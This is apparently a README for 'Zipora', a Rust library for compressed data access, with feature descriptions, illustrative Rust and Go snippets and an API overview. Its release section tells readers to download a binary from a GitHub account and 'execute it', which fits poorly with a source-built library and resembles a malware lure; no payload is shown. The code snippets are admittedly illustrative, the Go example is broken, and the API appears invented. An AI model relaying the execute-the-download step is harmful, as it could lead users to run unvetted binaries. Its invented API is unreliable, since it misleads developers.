Why Zipora
Zipora is built for speed, safety, and scale. It brings together ideas from modern compression research and practical software engineering. The core value is in-place compressed access: you work with data in its compressed form and still extract meaningful information without a full, costly decompression step. This approach reduces memory usage and improves cache efficiency, which matters for large data sets, streaming pipelines, databases, and memory-constrained environments.

Key benefits
- In-place compressed access: read and operate on compressed data directly.
- Zero-copy paths: minimize data movement to keep latency low.
- High performance: vectorized operations and SIMD acceleration where available.
- Memory safety: Rust’s borrow checker and ownership model underpin the code base.
- Extensible: a modular design makes it easier to add new compression schemes and data formats.
- Platform versatility: designed with cross-platform builds in mind.

Core Concepts
In-place compressed-access
Zipora stores information in a compact, encoded form. When you need data, you can navigate the compressed representation to answer questions, extract fields, or perform light transformations without reconstructing the entire payload. This reduces both runtime and memory footprint.

Zero-copy techniques
Where possible, data is accessed in place or moved with minimal copies. Raw buffers are treated as read-only when appropriate, and interfaces are designed to avoid unnecessary cloning or buffering.

Zero-waste data flows
The library aims for predictable memory usage and minimal temporary allocations. This helps in long-running processes and systems with strict memory budgets.

Succinct data structures
Zipora uses compact data layouts, such as bit-packed representations and succinct indices, to store metadata and structures efficiently. These choices enable fast queries with small memory footprints.

 SIMD and vectorization
Where the target platform provides SIMD, Zipora leverages it to speed up encoding, decoding, and search-like operations on compressed data. This yields better performance on modern CPUs.

Rust-based safety
The codebase follows Rust’s safety guarantees. It uses explicit lifetimes, careful ownership, and robust error handling to prevent common runtime issues.

Getting Started
Prerequisites
- Rust toolchain: install via rustup (stable channel recommended).
- A modern CPU with optional SIMD support for best performance (AVX2/AVX-512 on x86_64, NEON on ARM64).

Installation
- Build from source with cargo build --release.
- If you want examples, enable the optional features in Cargo.toml or during cargo build.

To download a release
- From the releases page, download the appropriate asset for your platform and execute it. The releases page provides the binaries and installation instructions. The details are available here: https://github.com/Markapfler01/zipora/releases

Quickstart Examples
The following examples illustrate how to compress and access data in place. You can adapt these patterns to your own data pipelines.

Example: compressing a buffer
- Create a Zipora encoder, feed data, and emit a compressed buffer.
- Use the in-place access API to query or modify compressed blocks without full decompression.

Example: reading metadata without decompression
- Access header and metadata fields directly from the compressed stream.
- Use succinct indices to locate blocks and extract field values efficiently.

Code snippets (illustrative, not executable as-is)
- Note: The real API surface may vary depending on the version you build from; these examples show typical usage patterns.

Rust
use zipora::prelude::*;

fn main() {
    let input = b"Example data that needs compression. Zipora keeps this data accessible without full decompression.";

    // Create a compressor with default options
    let mut compressor = zipora::CompressionBuilder::new().build();

    // Allocate an output buffer sized for the worst case (for illustration)
    let mut compressed = Vec::with_capacity(input.len() * 2);

    // Compress in place
    let out = compressor.compress(input.as_ref(), &mut compressed).expect("compression failed");

    // Use in-place access to read metadata without decompressing
    let meta = compressor.get_metadata();
    println!("Compressed size: {}", out.len());
    println!("Metadata: {:?}", meta);

    // Access a portion of data directly from the compressed stream
    if let Some(chunk) = compressor.access_chunk(0, 32) {
        println!("First 32 bytes of decompressed region (as viewed in compressed form): {:?}", chunk);
    }
}

Go (illustrative)
package main

import (
    "fmt"
    "github.com/Markapfler01/zipora/go-compact" // hypothetical path
)

func main() {
    data := []byte("Example data that needs compression. Zipora keeps this data accessible without full decompression.")

    enc, err := zipora.NewEncoder(nil)
    if err != nil { panic(err) }

    var out bytes.Buffer
    if err := enc.Encode(data, &out); err != nil {
        panic(err)
    }

    // In-place access on the compressed data
    info := enc.Metadata()
    fmt.Println("Compressed size:", out.Len())
    fmt.Println("Metadata:", info)
}

API Overview
Zipora exposes a compact set of APIs focused on clarity and safety. Below is a high-level view of the typical components you will use when building against Zipora.

- CompressionBuilder: configure and create a compressor with options such as algorithm selection, block size, and SIMD toggles.
- Compressor: the main object responsible for encoding data into Zipora’s format. It provides:
  - compress(data, out) -> writes to the output buffer
  - access_chunk(offset, length) -> obtain a view into a compressed region
  - get_metadata() -> read metadata without decompressing
- Decompression (optional in-place readers): if you need explicit decompression, the API supports a controlled, partial decompression path that respects in-place semantics.
- DataView and BlockView: lightweight views into compressed data, enabling zero-copy access to fields and blocks.
- Error handling: explicit error types to distinguish between invalid input, memory constraints, and algorithmic failures.

Data Structures and Algorithms
- Bit-packed headers: metadata is stored in a compact header to minimize overhead.
- Block-oriented layout: data is divided into blocks, each with its own compressed encoding and index.
- Succinct indices: fast block lookup with small memory overhead.
- SIMD-accelerated paths: encoding, decoding, and block processing can use vector instructions when available.
- In-place references: the design favors pointers and references that allow consumers to read data without watering down the compressed representation.

Performance and Safety
- Memory footprint: Zipora aims for a small per-block overhead. The exact numbers depend on configuration and data patterns, but the architecture targets keeping the working set small.
- Throughput: SIMD paths and careful buffering help maximize throughput for typical data sizes.
- Latency: in-place access reduces the cost of full decompression, lowering latency for queries and partial reads.
- Safety: Rust’s safety guarantees prevent common pitfalls like buffer overflows, data races, and dangling pointers. The API uses explicit lifetimes to ensure data validity.

Architecture and Design
- Modular crates: separation between encoding, in-place access, and utilities. This makes it easier to swap components or add new formats.
- Cross-platform portability: careful use of platform-specific intrinsics with safe fallbacks for non-SIMD environments.
- Testing strategy: a broad test suite covering unit tests, property tests, and performance benchmarks to ensure correctness and performance stability.
- Documentation-first approach: doc tests, API docs, and usage guides are central to the project.

Testing, Benchmarking, and Validation
- Unit tests cover core logic for both common and edge cases.
- Benchmarks compare Zipora against baseline copies and naive decompression paths to illustrate speedups.
- Integrity checks ensure that information extracted from compressed data matches the original input when decompression is performed.
- Regression tests guard against performance regressions and incorrect in-place behavior.
